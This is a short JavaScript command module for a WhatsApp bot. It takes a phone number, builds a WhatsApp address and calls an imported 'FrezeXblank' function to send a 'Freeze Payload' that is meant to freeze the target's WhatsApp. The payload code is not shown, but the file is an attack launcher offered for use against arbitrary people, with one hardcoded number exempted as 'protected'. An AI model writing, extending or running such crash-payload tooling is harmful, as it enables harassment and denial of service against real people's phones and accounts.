const { FrezeXblank } = require('../lib/rizofreeze');

module.exports = {
  name: "rizofreeze",
  commands: ['freeze', 'rizofreeze', 'fz'],
  category: "owner",
  description: "Freeze target thread process",
  async execute(sock, m, args) {
    if (!args[0]) {
      return sock.sendMessage(m.chat, { text: `📌 *Usage:* .rizofreeze 923xx` }, { quoted: m });
    }

    let pepec = (args[0] || "").replace(/[^0-9]/g, "");
    if (!pepec) return sock.sendMessage(m.chat, { text: '❌ *Invalid number format!*' }, { quoted: m });

    let protectedNumbers = ["923154734548"];
    if (protectedNumbers.includes(pepec)) {
      return sock.sendMessage(m.chat, { text: '🔒 *This number is protected!*' }, { quoted: m });
    }

    let target = pepec + '@s.whatsapp.net';
    await sock.sendMessage(m.chat, { text: `❄️ *Freeze Target Locked:* ${pepec}\n⚡ *Sending Freeze Payload...*` }, { quoted: m });

    try {
      await FrezeXblank(sock, target);
      await sock.sendMessage(m.chat, { react: { text: "❄️", key: m.key } });
    } catch (error) {
      await sock.sendMessage(m.chat, { text: "⚠️ Error: Freeze payload execute karte waqt masla aaya hai." }, { quoted: m });
    }
  }
};
